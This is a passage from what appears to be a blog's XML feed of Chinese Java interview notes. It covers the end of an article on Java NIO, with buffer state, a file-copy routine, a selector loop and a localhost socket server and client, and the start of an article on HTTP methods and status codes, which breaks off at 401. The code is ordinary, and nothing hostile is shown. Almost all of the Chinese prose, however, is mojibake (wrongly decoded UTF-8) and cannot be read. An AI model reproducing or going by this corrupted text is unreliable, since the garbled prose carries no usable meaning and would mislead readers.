é€šå¸¸ç›¸å½“æ…¢ã€‚ é¢å‘å—çš„ I/O ä¸€æ¬¡å¤„ç†ä¸€ä¸ªæ•°æ®å—ï¼ŒæŒ‰å—å¤„ç†æ•°æ®æ¯”æŒ‰æµå¤„ç†æ•°æ®è¦å¿«å¾—å¤šã€‚ä½†æ˜¯é¢å‘å—çš„ I/O ç¼ºå°‘ä¸€äº›é¢å‘æµçš„ I/O æ‰€å…·æœ‰çš„ä¼˜é›…æ€§å’Œç®€å•æ€§ã€‚ I/O åŒ…å’Œ NIO å·²ç»å¾ˆå¥½åœ°é›†æˆäº†ï¼Œjava.io.* å·²ç»ä»¥ NIO ä¸ºåŸºç¡€é‡æ–°å®ç°äº†ï¼Œæ‰€ä»¥ç°åœ¨å®ƒå¯ä»¥åˆ©ç”¨ NIO çš„ä¸€äº›ç‰¹æ€§ã€‚ä¾‹å¦‚ï¼Œjava.io.* åŒ…ä¸­çš„ä¸€äº›ç±»åŒ…å«ä»¥å—çš„å½¢å¼è¯»å†™æ•°æ®çš„æ–¹æ³•ï¼Œè¿™ä½¿å¾—å³ä½¿åœ¨é¢å‘æµçš„ç³»ç»Ÿä¸­ï¼Œå¤„ç†é€Ÿåº¦ä¹Ÿä¼šæ›´å¿«ã€‚ é€šé“ä¸ç¼“å†²åŒº1. é€šé“é€šé“ Channel æ˜¯å¯¹åŸ I/O åŒ…ä¸­çš„æµçš„æ¨¡æ‹Ÿï¼Œå¯ä»¥é€šè¿‡å®ƒè¯»å–å’Œå†™å…¥æ•°æ®ã€‚ é€šé“ä¸æµçš„ä¸åŒä¹‹å¤„åœ¨äºï¼Œæµåªèƒ½åœ¨ä¸€ä¸ªæ–¹å‘ä¸Šç§»åŠ¨ï¼Œ(ä¸€ä¸ªæµå¿…é¡»æ˜¯ InputStream æˆ–è€… OutputStream çš„å­ç±»)ï¼Œè€Œé€šé“æ˜¯åŒå‘çš„ï¼Œå¯ä»¥ç”¨äºè¯»ã€å†™æˆ–è€…åŒæ—¶ç”¨äºè¯»å†™ã€‚ é€šé“åŒ…æ‹¬ä»¥ä¸‹ç±»å‹ï¼š FileChannelï¼šä»æ–‡ä»¶ä¸­è¯»å†™æ•°æ®ï¼› DatagramChannelï¼šé€šè¿‡ UDP è¯»å†™ç½‘ç»œä¸­æ•°æ®ï¼› SocketChannelï¼šé€šè¿‡ TCP è¯»å†™ç½‘ç»œä¸­æ•°æ®ï¼› ServerSocketChannelï¼šå¯ä»¥ç›‘å¬æ–°è¿›æ¥çš„ TCP è¿æ¥ï¼Œå¯¹æ¯ä¸€ä¸ªæ–°è¿›æ¥çš„è¿æ¥éƒ½ä¼šåˆ›å»ºä¸€ä¸ª SocketChannelã€‚ 2. ç¼“å†²åŒºå‘é€ç»™ä¸€ä¸ªé€šé“çš„æ‰€æœ‰æ•°æ®éƒ½å¿…é¡»é¦–å…ˆæ”¾åˆ°ç¼“å†²åŒºä¸­ï¼ŒåŒæ ·åœ°ï¼Œä»é€šé“ä¸­è¯»å–çš„ä»»ä½•æ•°æ®éƒ½è¦å…ˆè¯»åˆ°ç¼“å†²åŒºä¸­ã€‚ä¹Ÿå°±æ˜¯è¯´ï¼Œä¸ä¼šç›´æ¥å¯¹é€šé“è¿›è¡Œè¯»å†™æ•°æ®ï¼Œè€Œæ˜¯è¦å…ˆç»è¿‡ç¼“å†²åŒºã€‚ ç¼“å†²åŒºå®è´¨ä¸Šæ˜¯ä¸€ä¸ªæ•°ç»„ï¼Œä½†å®ƒä¸ä»…ä»…æ˜¯ä¸€ä¸ªæ•°ç»„ã€‚ç¼“å†²åŒºæä¾›äº†å¯¹æ•°æ®çš„ç»“æ„åŒ–è®¿é—®ï¼Œè€Œä¸”è¿˜å¯ä»¥è·Ÿè¸ªç³»ç»Ÿçš„è¯»/å†™è¿›ç¨‹ã€‚ ç¼“å†²åŒºåŒ…æ‹¬ä»¥ä¸‹ç±»å‹ï¼š ByteBuffer CharBuffer ShortBuffer IntBuffer LongBuffer FloatBuffer DoubleBuffer ç¼“å†²åŒºçŠ¶æ€å˜é‡ capacityï¼šæœ€å¤§å®¹é‡ï¼› positionï¼šå½“å‰å·²ç»è¯»å†™çš„å­—èŠ‚æ•°ï¼› limitï¼šè¿˜å¯ä»¥è¯»å†™çš„å­—èŠ‚æ•°ã€‚ çŠ¶æ€å˜é‡çš„æ”¹å˜è¿‡ç¨‹ä¸¾ä¾‹ï¼š â‘  æ–°å»ºä¸€ä¸ªå¤§å°ä¸º 8 ä¸ªå­—èŠ‚çš„ç¼“å†²åŒºï¼Œæ­¤æ—¶ position ä¸º 0ï¼Œè€Œ limit = capacity = 8ã€‚capacity å˜é‡ä¸ä¼šæ”¹å˜ï¼Œä¸‹é¢çš„è®¨è®ºä¼šå¿½ç•¥å®ƒã€‚ â‘¡ ä»è¾“å…¥é€šé“ä¸­è¯»å– 5 ä¸ªå­—èŠ‚æ•°æ®å†™å…¥ç¼“å†²åŒºä¸­ï¼Œæ­¤æ—¶ position ç§»åŠ¨è®¾ç½®ä¸º 5ï¼Œlimit ä¿æŒä¸å˜ã€‚ â‘¢ åœ¨å°†ç¼“å†²åŒºçš„æ•°æ®å†™åˆ°è¾“å‡ºé€šé“ä¹‹å‰ï¼Œéœ€è¦å…ˆè°ƒç”¨ flip() æ–¹æ³•ï¼Œè¿™ä¸ªæ–¹æ³•å°† limit è®¾ç½®ä¸ºå½“å‰ positionï¼Œå¹¶å°† position è®¾ç½®ä¸º 0ã€‚ â‘£ ä»ç¼“å†²åŒºä¸­å– 4 ä¸ªå­—èŠ‚åˆ°è¾“å‡ºç¼“å†²ä¸­ï¼Œæ­¤æ—¶ position è®¾ä¸º 4ã€‚ â‘¤ æœ€åéœ€è¦è°ƒç”¨ clear() æ–¹æ³•æ¥æ¸…ç©ºç¼“å†²åŒºï¼Œæ­¤æ—¶ position å’Œ limit éƒ½è¢«è®¾ç½®ä¸ºæœ€åˆä½ç½®ã€‚ æ–‡ä»¶ NIO å®ä¾‹ä»¥ä¸‹å±•ç¤ºäº†ä½¿ç”¨ NIO å¿«é€Ÿå¤åˆ¶æ–‡ä»¶çš„å®ä¾‹ï¼š 1234567891011121314151617public static void fastCopy(String src, String dist) throws IOException&#123; FileInputStream fin = new FileInputStream(src); /* è·å¾—æºæ–‡ä»¶çš„è¾“å…¥å­—èŠ‚æµ */ FileChannel fcin = fin.getChannel(); /* è·å–è¾“å…¥å­—èŠ‚æµçš„æ–‡ä»¶é€šé“ */ FileOutputStream fout = new FileOutputStream(dist); /* è·å–ç›®æ ‡æ–‡ä»¶çš„è¾“å‡ºå­—èŠ‚æµ */ FileChannel fcout = fout.getChannel(); /* è·å–è¾“å‡ºå­—èŠ‚æµçš„é€šé“ */ ByteBuffer buffer = ByteBuffer.allocateDirect(1024); /* ä¸ºç¼“å†²åŒºåˆ†é… 1024 ä¸ªå­—èŠ‚ */ while (true) &#123; int r = fcin.read(buffer); /* ä»è¾“å…¥é€šé“ä¸­è¯»å–æ•°æ®åˆ°ç¼“å†²åŒºä¸­ */ if (r == -1) &#123; /* read() è¿”å› -1 è¡¨ç¤º EOF */ break; &#125; buffer.flip(); /* åˆ‡æ¢è¯»å†™ */ fcout.write(buffer); /* æŠŠç¼“å†²åŒºçš„å†…å®¹å†™å…¥è¾“å‡ºæ–‡ä»¶ä¸­ */ buffer.clear(); /* æ¸…ç©ºç¼“å†²åŒº */ &#125;&#125; é€‰æ‹©å™¨ä¸€ä¸ªçº¿ç¨‹ Thread ä½¿ç”¨ä¸€ä¸ªé€‰æ‹©å™¨ Selector é€šè¿‡è½®è¯¢çš„æ–¹å¼å»ç›‘å¬å¤šä¸ªé€šé“ Channel ä¸Šçš„äº‹ä»¶ï¼Œä»è€Œè®©ä¸€ä¸ªçº¿ç¨‹å°±å¯ä»¥å¤„ç†å¤šä¸ªäº‹ä»¶ã€‚ å› ä¸ºåˆ›å»ºå’Œåˆ‡æ¢çº¿ç¨‹çš„å¼€é”€å¾ˆå¤§ï¼Œå› æ­¤ä½¿ç”¨ä¸€ä¸ªçº¿ç¨‹æ¥å¤„ç†å¤šä¸ªäº‹ä»¶è€Œä¸æ˜¯ä¸€ä¸ªçº¿ç¨‹å¤„ç†ä¸€ä¸ªäº‹ä»¶å…·æœ‰æ›´å¥½çš„æ€§èƒ½ã€‚ 1. åˆ›å»ºé€‰æ‹©å™¨1Selector selector = Selector.open(); 2. å°†é€šé“æ³¨å†Œåˆ°é€‰æ‹©å™¨ä¸Š123ServerSocketChannel ssChannel = ServerSocketChannel.open();ssChannel.configureBlocking(false);ssChannel.register(selector, SelectionKey.OP_ACCEPT); é€šé“å¿…é¡»é…ç½®ä¸ºéé˜»å¡æ¨¡å¼ï¼Œå¦åˆ™ä½¿ç”¨é€‰æ‹©å™¨å°±æ²¡æœ‰ä»»ä½•æ„ä¹‰äº†ï¼Œå› ä¸ºå¦‚æœé€šé“åœ¨æŸä¸ªäº‹ä»¶ä¸Šè¢«é˜»å¡ï¼Œé‚£ä¹ˆæœåŠ¡å™¨å°±ä¸èƒ½å“åº”å…¶å®ƒäº‹ä»¶ï¼Œå¿…é¡»ç­‰å¾…è¿™ä¸ªäº‹ä»¶å¤„ç†å®Œæ¯•æ‰èƒ½å»å¤„ç†å…¶å®ƒäº‹ä»¶ï¼Œæ˜¾ç„¶è¿™å’Œé€‰æ‹©å™¨çš„ä½œç”¨èƒŒé“è€Œé©°ã€‚ åœ¨å°†é€šé“æ³¨å†Œåˆ°é€‰æ‹©å™¨ä¸Šæ—¶ï¼Œè¿˜éœ€è¦æŒ‡å®šè¦æ³¨å†Œçš„å…·ä½“äº‹ä»¶ï¼Œä¸»è¦æœ‰ä»¥ä¸‹å‡ ç±»ï¼š SelectionKey.OP_CONNECT SelectionKey.OP_ACCEPT SelectionKey.OP_READ SelectionKey.OP_WRITE å®ƒä»¬åœ¨ SelectionKey çš„å®šä¹‰å¦‚ä¸‹ï¼š 1234public static final int OP_READ = 1 &lt;&lt; 0;public static final int OP_WRITE = 1 &lt;&lt; 2;public static final int OP_CONNECT = 1 &lt;&lt; 3;public static final int OP_ACCEPT = 1 &lt;&lt; 4; å¯ä»¥çœ‹å‡ºæ¯ä¸ªäº‹ä»¶å¯ä»¥è¢«å½“æˆä¸€ä¸ªä½åŸŸï¼Œä»è€Œç»„æˆäº‹ä»¶é›†æ•´æ•°ã€‚ä¾‹å¦‚ï¼š 1int interestSet = SelectionKey.OP_READ | SelectionKey.OP_WRITE; 3. ç›‘å¬äº‹ä»¶1int num = selector.select(); ä½¿ç”¨ select() æ¥ç›‘å¬äº‹ä»¶åˆ°è¾¾ï¼Œå®ƒä¼šä¸€ç›´é˜»å¡ç›´åˆ°æœ‰è‡³å°‘ä¸€ä¸ªäº‹ä»¶åˆ°è¾¾ã€‚ 4. è·å–åˆ°è¾¾çš„äº‹ä»¶1234567891011Set&lt;SelectionKey&gt; keys = selector.selectedKeys();Iterator&lt;SelectionKey&gt; keyIterator = keys.iterator();while (keyIterator.hasNext()) &#123; SelectionKey key = keyIterator.next(); if (key.isAcceptable()) &#123; // ... &#125; else if (key.isReadable()) &#123; // ... &#125; keyIterator.remove();&#125; 5. äº‹ä»¶å¾ªç¯å› ä¸ºä¸€æ¬¡ select() è°ƒç”¨ä¸èƒ½å¤„ç†å®Œæ‰€æœ‰çš„äº‹ä»¶ï¼Œå¹¶ä¸”æœåŠ¡å™¨ç«¯æœ‰å¯èƒ½éœ€è¦ä¸€ç›´ç›‘å¬äº‹ä»¶ï¼Œå› æ­¤æœåŠ¡å™¨ç«¯å¤„ç†äº‹ä»¶çš„ä»£ç ä¸€èˆ¬ä¼šæ”¾åœ¨ä¸€ä¸ªæ­»å¾ªç¯å†…ã€‚ 1234567891011121314while (true) &#123; int num = selector.select(); Set&lt;SelectionKey&gt; keys = selector.selectedKeys(); Iterator&lt;SelectionKey&gt; keyIterator = keys.iterator(); while (keyIterator.hasNext()) &#123; SelectionKey key = keyIterator.next(); if (key.isAcceptable()) &#123; // ... &#125; else if (key.isReadable()) &#123; // ... &#125; keyIterator.remove(); &#125;&#125; å¥—æ¥å­— NIO å®ä¾‹12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758public class NIOServer&#123; public static void main(String[] args) throws IOException &#123; Selector selector = Selector.open(); ServerSocketChannel ssChannel = ServerSocketChannel.open(); ssChannel.configureBlocking(false); ssChannel.register(selector, SelectionKey.OP_ACCEPT); ServerSocket serverSocket = ssChannel.socket(); InetSocketAddress address = new InetSocketAddress("127.0.0.1", 8888); serverSocket.bind(address); while (true) &#123; selector.select(); Set&lt;SelectionKey&gt; keys = selector.selectedKeys(); Iterator&lt;SelectionKey&gt; keyIterator = keys.iterator(); while (keyIterator.hasNext()) &#123; SelectionKey key = keyIterator.next(); if (key.isAcceptable()) &#123; ServerSocketChannel ssChannel1 = (ServerSocketChannel) key.channel(); // æœåŠ¡å™¨ä¼šä¸ºæ¯ä¸ªæ–°è¿æ¥åˆ›å»ºä¸€ä¸ª SocketChannel SocketChannel sChannel = ssChannel1.accept(); sChannel.configureBlocking(false); // è¿™ä¸ªæ–°è¿æ¥ä¸»è¦ç”¨äºä»å®¢æˆ·ç«¯è¯»å–æ•°æ® sChannel.register(selector, SelectionKey.OP_READ); &#125; else if (key.isReadable()) &#123; SocketChannel sChannel = (SocketChannel) key.channel(); System.out.println(readDataFromSocketChannel(sChannel)); sChannel.close(); &#125; keyIterator.remove(); &#125; &#125; &#125; private static String readDataFromSocketChannel(SocketChannel sChannel) throws IOException &#123; ByteBuffer buffer = ByteBuffer.allocate(1024); StringBuilder data = new StringBuilder(); while (true) &#123; buffer.clear(); int n = sChannel.read(buffer); if (n == -1) &#123; break; &#125; buffer.flip(); int limit = buffer.limit(); char[] dst = new char[limit]; for (int i = 0; i &lt; limit; i++) &#123; dst[i] = (char) buffer.get(i); &#125; data.append(dst); buffer.clear(); &#125; return data.toString(); &#125;&#125; 1234567891011public class NIOClient&#123; public static void main(String[] args) throws IOException &#123; Socket socket = new Socket("127.0.0.1", 8888); OutputStream out = socket.getOutputStream(); String s = "hello world"; out.write(s.getBytes()); out.close(); &#125;&#125; å†…å­˜æ˜ å°„æ–‡ä»¶å†…å­˜æ˜ å°„æ–‡ä»¶ I/O æ˜¯ä¸€ç§è¯»å’Œå†™æ–‡ä»¶æ•°æ®çš„æ–¹æ³•ï¼Œå®ƒå¯ä»¥æ¯”å¸¸è§„çš„åŸºäºæµæˆ–è€…åŸºäºé€šé“çš„ I/O å¿«å¾—å¤šã€‚ åªæœ‰æ–‡ä»¶ä¸­å®é™…è¯»å–æˆ–è€…å†™å…¥çš„éƒ¨åˆ†æ‰ä¼šæ˜ å°„åˆ°å†…å­˜ä¸­ã€‚ ç°ä»£æ“ä½œç³»ç»Ÿä¸€èˆ¬ä¼šæ ¹æ®éœ€è¦å°†æ–‡ä»¶çš„éƒ¨åˆ†æ˜ å°„ä¸ºå†…å­˜çš„éƒ¨åˆ†ï¼Œä»è€Œå®ç°æ–‡ä»¶ç³»ç»Ÿã€‚Java å†…å­˜æ˜ å°„æœºåˆ¶åªä¸è¿‡æ˜¯åœ¨åº•å±‚æ“ä½œç³»ç»Ÿä¸­å¯ä»¥é‡‡ç”¨è¿™ç§æœºåˆ¶æ—¶ï¼Œæä¾›äº†å¯¹è¯¥æœºåˆ¶çš„è®¿é—®ã€‚ å‘å†…å­˜æ˜ å°„æ–‡ä»¶å†™å…¥å¯èƒ½æ˜¯å±é™©çš„ï¼Œä»…åªæ˜¯æ”¹å˜æ•°ç»„çš„å•ä¸ªå…ƒç´ è¿™æ ·çš„ç®€å•æ“ä½œï¼Œå°±å¯èƒ½ä¼šç›´æ¥ä¿®æ”¹ç£ç›˜ä¸Šçš„æ–‡ä»¶ã€‚ä¿®æ”¹æ•°æ®ä¸å°†æ•°æ®ä¿å­˜åˆ°ç£ç›˜æ˜¯æ²¡æœ‰åˆ†å¼€çš„ã€‚ ä¸‹é¢ä»£ç è¡Œå°†æ–‡ä»¶çš„å‰ 1024 ä¸ªå­—èŠ‚æ˜ å°„åˆ°å†…å­˜ä¸­ï¼Œmap() æ–¹æ³•è¿”å›ä¸€ä¸ª MappedByteBufferï¼Œå®ƒæ˜¯ ByteBuffer çš„å­ç±»ã€‚å› æ­¤ï¼Œæ‚¨å¯ä»¥åƒä½¿ç”¨å…¶ä»–ä»»ä½• ByteBuffer ä¸€æ ·ä½¿ç”¨æ–°æ˜ å°„çš„ç¼“å†²åŒºï¼Œæ“ä½œç³»ç»Ÿä¼šåœ¨éœ€è¦æ—¶è´Ÿè´£æ‰§è¡Œæ˜ å°„ã€‚ 1MappedByteBuffer mbb = fc.map(FileChannel.MapMode.READ_WRITE, 0, 1024); å¯¹æ¯”NIO ä¸æ™®é€š I/O çš„åŒºåˆ«ä¸»è¦æœ‰ä»¥ä¸‹ä¸¤ç‚¹ï¼š NIO æ˜¯éé˜»å¡çš„ã€‚åº”å½“æ³¨æ„ï¼ŒFileChannel ä¸èƒ½åˆ‡æ¢åˆ°éé˜»å¡æ¨¡å¼ï¼Œå¥—æ¥å­— Channel å¯ä»¥ã€‚ NIO é¢å‘å—ï¼ŒI/O é¢å‘æµã€‚ å…«ã€å‚è€ƒèµ„æ–™ Eckel B, åŸƒå…‹å°”, æ˜Šé¹, ç­‰. Java ç¼–ç¨‹æ€æƒ³ [M]. æœºæ¢°å·¥ä¸šå‡ºç‰ˆç¤¾, 2002. IBM: NIO å…¥é—¨ IBM: æ·±å…¥åˆ†æ Java I/O çš„å·¥ä½œæœºåˆ¶ IBM: æ·±å…¥åˆ†æ Java ä¸­çš„ä¸­æ–‡ç¼–ç é—®é¢˜ IBM: Java åºåˆ—åŒ–çš„é«˜çº§è®¤è¯† NIO ä¸ä¼ ç»Ÿ IO çš„åŒºåˆ« Decorator Design Pattern Socket Multicast]]></content>
      <categories>
        <category>Github</category>
        <category>Interview-Notebook</category>
      </categories>
      <tags>
        <tag>æŠ€æœ¯</tag>
        <tag>Java</tag>
        <tag>è½¬è½½</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[HTTP]]></title>
    <url>%2F2018%2F07%2F04%2FJava%2FInterview%2FInterview-Notebook%2FHTTP%2F</url>
    <content type="text"><![CDATA[ä¸€ ã€åŸºç¡€æ¦‚å¿µ URL è¯·æ±‚å’Œå“åº”æŠ¥æ–‡ äºŒã€HTTP æ–¹æ³• GET HEAD POST PUT PATCH DELETE OPTIONS CONNECT TRACE ä¸‰ã€HTTP çŠ¶æ€ç  1XX ä¿¡æ¯ 2XX æˆåŠŸ 3XX é‡å®šå‘ 4XX å®¢æˆ·ç«¯é”™è¯¯ 5XX æœåŠ¡å™¨é”™è¯¯ å››ã€HTTP é¦–éƒ¨ é€šç”¨é¦–éƒ¨å­—æ®µ è¯·æ±‚é¦–éƒ¨å­—æ®µ å“åº”é¦–éƒ¨å­—æ®µ å®ä½“é¦–éƒ¨å­—æ®µ äº”ã€å…·ä½“åº”ç”¨ Cookie ç¼“å­˜ è¿æ¥ç®¡ç† å†…å®¹åå•† å†…å®¹ç¼–ç  èŒƒå›´è¯·æ±‚ åˆ†å—ä¼ è¾“ç¼–ç  å¤šéƒ¨åˆ†å¯¹è±¡é›†åˆ è™šæ‹Ÿä¸»æœº é€šä¿¡æ•°æ®è½¬å‘ å…­ã€HTTPs åŠ å¯† è®¤è¯ å®Œæ•´æ€§ä¿æŠ¤ HTTPs çš„ç¼ºç‚¹ é…ç½® HTTPs ä¸ƒã€Web æ”»å‡»æŠ€æœ¯ è·¨ç«™è„šæœ¬æ”»å‡» è·¨ç«™è¯·æ±‚ä¼ªé€  SQL æ³¨å…¥æ”»å‡» æ‹’ç»æœåŠ¡æ”»å‡» å…«ã€GET å’Œ POST çš„åŒºåˆ« ä½œç”¨ å‚æ•° å®‰å…¨ å¹‚ç­‰æ€§ å¯ç¼“å­˜ XMLHttpRequest ä¹ã€HTTP/1.0 ä¸ HTTP/1.1 çš„åŒºåˆ« åã€HTTP/2.0 HTTP/1.x ç¼ºé™· äºŒè¿›åˆ¶åˆ†å¸§å±‚ æœåŠ¡ç«¯æ¨é€ é¦–éƒ¨å‹ç¼© å‚è€ƒèµ„æ–™ ä¸€ ã€åŸºç¡€æ¦‚å¿µURL URIï¼ˆUniform Resource Indentifierï¼Œç»Ÿä¸€èµ„æºæ ‡è¯†ç¬¦ï¼‰ URLï¼ˆUniform Resource Locatorï¼Œç»Ÿä¸€èµ„æºå®šä½ç¬¦ï¼‰ URNï¼ˆUniform Resource Nameï¼Œç»Ÿä¸€èµ„æºåç§°ï¼‰ï¼Œä¾‹å¦‚ urn:isbn:0-486-27557-4ã€‚ URI åŒ…å« URL å’Œ URNï¼Œç›®å‰ WEB åªæœ‰ URL æ¯”è¾ƒæµè¡Œï¼Œæ‰€ä»¥è§åˆ°çš„åŸºæœ¬éƒ½æ˜¯ URLã€‚ è¯·æ±‚å’Œå“åº”æŠ¥æ–‡1. è¯·æ±‚æŠ¥æ–‡ 2. å“åº”æŠ¥æ–‡ äºŒã€HTTP æ–¹æ³•å®¢æˆ·ç«¯å‘é€çš„ è¯·æ±‚æŠ¥æ–‡ ç¬¬ä¸€è¡Œä¸ºè¯·æ±‚è¡Œï¼ŒåŒ…å«äº†æ–¹æ³•å­—æ®µã€‚ GET è·å–èµ„æº å½“å‰ç½‘ç»œè¯·æ±‚ä¸­ï¼Œç»å¤§éƒ¨åˆ†ä½¿ç”¨çš„æ˜¯ GET æ–¹æ³•ã€‚ HEAD è·å–æŠ¥æ–‡é¦–éƒ¨ å’Œ GET æ–¹æ³•ä¸€æ ·ï¼Œä½†æ˜¯ä¸è¿”å›æŠ¥æ–‡å®ä½“ä¸»ä½“éƒ¨åˆ†ã€‚ ä¸»è¦ç”¨äºç¡®è®¤ URL çš„æœ‰æ•ˆæ€§ä»¥åŠèµ„æºæ›´æ–°çš„æ—¥æœŸæ—¶é—´ç­‰ã€‚ POST ä¼ è¾“å®ä½“ä¸»ä½“ POST ä¸»è¦ç”¨æ¥ä¼ è¾“æ•°æ®ï¼Œè€Œ GET ä¸»è¦ç”¨æ¥è·å–èµ„æºã€‚ æ›´å¤š POST ä¸ GET çš„æ¯”è¾ƒè¯·è§ç¬¬å…«ç« ã€‚ PUT ä¸Šä¼ æ–‡ä»¶ ç”±äºè‡ªèº«ä¸å¸¦éªŒè¯æœºåˆ¶ï¼Œä»»ä½•äººéƒ½å¯ä»¥ä¸Šä¼ æ–‡ä»¶ï¼Œå› æ­¤å­˜åœ¨å®‰å…¨æ€§é—®é¢˜ï¼Œä¸€èˆ¬ä¸ä½¿ç”¨è¯¥æ–¹æ³•ã€‚ 123456PUT /new.html HTTP/1.1Host: example.comContent-type: text/htmlContent-length: 16&lt;p&gt;New File&lt;/p&gt; PATCH å¯¹èµ„æºè¿›è¡Œéƒ¨åˆ†ä¿®æ”¹ PUT ä¹Ÿå¯ä»¥ç”¨äºä¿®æ”¹èµ„æºï¼Œä½†æ˜¯åªèƒ½å®Œå…¨æ›¿ä»£åŸå§‹èµ„æºï¼ŒPATCH å…è®¸éƒ¨åˆ†ä¿®æ”¹ã€‚ 1234567PATCH /file.txt HTTP/1.1Host: www.example.comContent-Type: application/exampleIf-Match: "e0023aa4e"Content-Length: 100[description of changes] DELETE åˆ é™¤æ–‡ä»¶ ä¸ PUT åŠŸèƒ½ç›¸åï¼Œå¹¶ä¸”åŒæ ·ä¸å¸¦éªŒè¯æœºåˆ¶ã€‚ 1DELETE /file.html HTTP/1.1 OPTIONS æŸ¥è¯¢æ”¯æŒçš„æ–¹æ³• æŸ¥è¯¢æŒ‡å®šçš„ URL èƒ½å¤Ÿæ”¯æŒçš„æ–¹æ³•ã€‚ ä¼šè¿”å› Allow: GET, POST, HEAD, OPTIONS è¿™æ ·çš„å†…å®¹ã€‚ CONNECT è¦æ±‚åœ¨ä¸ä»£ç†æœåŠ¡å™¨é€šä¿¡æ—¶å»ºç«‹éš§é“ ä½¿ç”¨ SSLï¼ˆSecure Sockets Layerï¼Œå®‰å…¨å¥—æ¥å±‚ï¼‰å’Œ TLSï¼ˆTransport Layer Securityï¼Œä¼ è¾“å±‚å®‰å…¨ï¼‰åè®®æŠŠé€šä¿¡å†…å®¹åŠ å¯†åç»ç½‘ç»œéš§é“ä¼ è¾“ã€‚ 1CONNECT www.example.com:443 HTTP/1.1 TRACE è¿½è¸ªè·¯å¾„ æœåŠ¡å™¨ä¼šå°†é€šä¿¡è·¯å¾„è¿”å›ç»™å®¢æˆ·ç«¯ã€‚ å‘é€è¯·æ±‚æ—¶ï¼Œåœ¨ Max-Forwards é¦–éƒ¨å­—æ®µä¸­å¡«å…¥æ•°å€¼ï¼Œæ¯ç»è¿‡ä¸€ä¸ªæœåŠ¡å™¨å°±ä¼šå‡ 1ï¼Œå½“æ•°å€¼ä¸º 0 æ—¶å°±åœæ­¢ä¼ è¾“ã€‚ é€šå¸¸ä¸ä¼šä½¿ç”¨ TRACEï¼Œå¹¶ä¸”å®ƒå®¹æ˜“å—åˆ° XST æ”»å‡»ï¼ˆCross-Site Tracingï¼Œè·¨ç«™è¿½è¸ªï¼‰ã€‚ ä¸‰ã€HTTP çŠ¶æ€ç æœåŠ¡å™¨è¿”å›çš„ å“åº”æŠ¥æ–‡ ä¸­ç¬¬ä¸€è¡Œä¸ºçŠ¶æ€è¡Œï¼ŒåŒ…å«äº†çŠ¶æ€ç ä»¥åŠåŸå› çŸ­è¯­ï¼Œç”¨æ¥å‘ŠçŸ¥å®¢æˆ·ç«¯è¯·æ±‚çš„ç»“æœã€‚ çŠ¶æ€ç  ç±»åˆ« åŸå› çŸ­è¯­ 1XX Informationalï¼ˆä¿¡æ¯æ€§çŠ¶æ€ç ï¼‰ æ¥æ”¶çš„è¯·æ±‚æ­£åœ¨å¤„ç† 2XX Successï¼ˆæˆåŠŸçŠ¶æ€ç ï¼‰ è¯·æ±‚æ­£å¸¸å¤„ç†å®Œæ¯• 3XX Redirectionï¼ˆé‡å®šå‘çŠ¶æ€ç ï¼‰ éœ€è¦è¿›è¡Œé™„åŠ æ“ä½œä»¥å®Œæˆè¯·æ±‚ 4XX Client Errorï¼ˆå®¢æˆ·ç«¯é”™è¯¯çŠ¶æ€ç ï¼‰ æœåŠ¡å™¨æ— æ³•å¤„ç†è¯·æ±‚ 5XX Server Errorï¼ˆæœåŠ¡å™¨é”™è¯¯çŠ¶æ€ç ï¼‰ æœåŠ¡å™¨å¤„ç†è¯·æ±‚å‡ºé”™ 1XX ä¿¡æ¯ 100 Continue ï¼šè¡¨æ˜åˆ°ç›®å‰ä¸ºæ­¢éƒ½å¾ˆæ­£å¸¸ï¼Œå®¢æˆ·ç«¯å¯ä»¥ç»§ç»­å‘é€è¯·æ±‚æˆ–è€…å¿½ç•¥è¿™ä¸ªå“åº”ã€‚ 2XX æˆåŠŸ 200 OK 204 No Content ï¼šè¯·æ±‚å·²ç»æˆåŠŸå¤„ç†ï¼Œä½†æ˜¯è¿”å›çš„å“åº”æŠ¥æ–‡ä¸åŒ…å«å®ä½“çš„ä¸»ä½“éƒ¨åˆ†ã€‚ä¸€èˆ¬åœ¨åªéœ€è¦ä»å®¢æˆ·ç«¯å¾€æœåŠ¡å™¨å‘é€ä¿¡æ¯ï¼Œè€Œä¸éœ€è¦è¿”å›æ•°æ®æ—¶ä½¿ç”¨ã€‚ 206 Partial Content ï¼šè¡¨ç¤ºå®¢æˆ·ç«¯è¿›è¡Œäº†èŒƒå›´è¯·æ±‚ã€‚å“åº”æŠ¥æ–‡åŒ…å«ç”± Content-Range æŒ‡å®šèŒƒå›´çš„å®ä½“å†…å®¹ã€‚ 3XX é‡å®šå‘ 301 Moved Permanently ï¼šæ°¸ä¹…æ€§é‡å®šå‘ 302 Found ï¼šä¸´æ—¶æ€§é‡å®šå‘ 303 See Other ï¼šå’Œ 302 æœ‰ç€ç›¸åŒçš„åŠŸèƒ½ï¼Œä½†æ˜¯ 303 æ˜ç¡®è¦æ±‚å®¢æˆ·ç«¯åº”è¯¥é‡‡ç”¨ GET æ–¹æ³•è·å–èµ„æºã€‚ æ³¨ï¼šè™½ç„¶ HTTP åè®®è§„å®š 301ã€302 çŠ¶æ€ä¸‹é‡å®šå‘æ—¶ä¸å…è®¸æŠŠ POST æ–¹æ³•æ”¹æˆ GET æ–¹æ³•ï¼Œä½†æ˜¯å¤§å¤šæ•°æµè§ˆå™¨éƒ½ä¼šåœ¨ 301ã€302 å’Œ 303 çŠ¶æ€ä¸‹çš„é‡å®šå‘æŠŠ POST æ–¹æ³•æ”¹æˆ GET æ–¹æ³•ã€‚ 304 Not Modified ï¼šå¦‚æœè¯·æ±‚æŠ¥æ–‡é¦–éƒ¨åŒ…å«ä¸€äº›æ¡ä»¶ï¼Œä¾‹å¦‚ï¼šIf-Matchï¼ŒIf-Modified-Sinceï¼ŒIf-None-Matchï¼ŒIf-Rangeï¼ŒIf-Unmodified-Sinceï¼Œå¦‚æœä¸æ»¡è¶³æ¡ä»¶ï¼Œåˆ™æœåŠ¡å™¨ä¼šè¿”å› 304 çŠ¶æ€ç ã€‚ 307 Temporary Redirect ï¼šä¸´æ—¶é‡å®šå‘ï¼Œä¸ 302 çš„å«ä¹‰ç±»ä¼¼ï¼Œä½†æ˜¯ 307 è¦æ±‚æµè§ˆå™¨ä¸ä¼šæŠŠé‡å®šå‘è¯·æ±‚çš„ POST æ–¹æ³•æ”¹æˆ GET æ–¹æ³•ã€‚ 4XX å®¢æˆ·ç«¯é”™è¯¯ 400 Bad Request ï¼šè¯·æ±‚æŠ¥æ–‡ä¸­å­˜åœ¨è¯­æ³•é”™è¯¯ã€‚ 401 Unauthorized 